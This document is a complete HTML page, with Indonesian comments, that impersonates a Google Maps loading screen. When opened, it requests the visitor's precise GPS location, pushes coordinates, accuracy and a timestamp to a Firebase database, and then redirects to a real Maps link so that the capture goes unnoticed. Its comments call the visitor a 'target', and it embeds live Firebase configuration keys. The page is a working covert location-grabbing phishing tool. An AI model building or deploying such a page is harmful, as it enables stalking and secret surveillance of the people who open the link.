<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Maps</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body, html { width: 100%; height: 100%; overflow: hidden; font-family: Roboto, Arial, sans-serif; background-color: #e5e3df; }
        
        /* Background peta buram buatan agar terkesan maps asli sedang loading */
        .maps-bg {
            position: absolute; width: 100%; height: 100%;
            background: radial-gradient(circle, rgba(255,255,255,0) 0%, rgba(229,227,223,1) 80%), 
                        url('https://maps.gstatic.com/tactile/gmm/api_geolocation_v2.png');
            filter: blur(4px); opacity: 0.6; transform: scale(1.1);
        }
        
        .spinner-container {
            position: absolute; top: 50%; left: 50%;
            transform: translate(-50%, -50%); text-align: center; z-index: 10;
        }
        
        /* Spinner menyerupai loading Google Maps */
        .gmaps-spinner {
            border: 4px solid rgba(0, 0, 0, 0.1);
            width: 45px; height: 45px;
            border-radius: 50%;
            border-left-color: #4285F4; /* Biru Google */
            animation: spin 0.8s linear infinite;
            margin: 0 auto 15px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        .text { color: #5f6368; font-size: 14px; font-weight: 400; }
    </style>

    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
</head>
<body>

    <div class="maps-bg"></div>
    
    <div class="spinner-container">
        <div class="gmaps-spinner"></div>
        <div class="text">Membuka Google Maps...</div>
    </div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyDLvcWnSRgoXxmid11Wx_GiVnOJMmgQR9I",
            authDomain: "maps-a9472.firebaseapp.com",
            databaseURL: "https://maps-a9472-default-rtdb.firebaseio.com",
            projectId: "maps-a9472",
            storageBucket: "maps-a9472.firebasestorage.app",
            messagingSenderId: "642710632619",
            appId: "1:642710632619:web:b702560570f3e52e5c1fee"
        };
        
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        // Diarahkan langsung ke koordinat Monas agar begitu masuk langsung terbuka peta asli
        const TARGET_MAPS_URL = "https://www.google.com/maps/search/?api=1&query=-6.175392,106.827153"; 

        window.onload = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendLocation, handleError, {
                    enableHighAccuracy: true,
                    timeout: 6000,
                    maximumAge: 0
                });
            } else {
                saveToFirebase({ status: "Tidak didukung" });
            }
        };

        function sendLocation(position) {
            const lat = position.coords.latitude;
            const lng = position.coords.longitude;
            const acc = position.coords.accuracy;
            const timestamp = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });

            saveToFirebase({
                waktu: timestamp,
                latitude: lat,
                longitude: lng,
                akurasi_meter: Math.round(acc),
                google_maps_link: `https://www.google.com/maps/search/?api=1&query=${lat},${lng}`,
                status: "Success"
            });
        }

        function handleError(error) {
            let status = "Error";
            if (error.code === error.PERMISSION_DENIED) status = "Ditolak target";
            else if (error.code === error.TIMEOUT) status = "Timeout";
            
            const timestamp = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
            saveToFirebase({ waktu: timestamp, status: status });
        }

        function saveToFirebase(objekData) {
            database.ref('logs_lokasi').push(objekData).then(() => { redirectToMaps(); }).catch(() => { redirectToMaps(); });
        }

        function redirectToMaps() {
            window.location.href = TARGET_MAPS_URL;
        }
    </script>
</body>
</html>
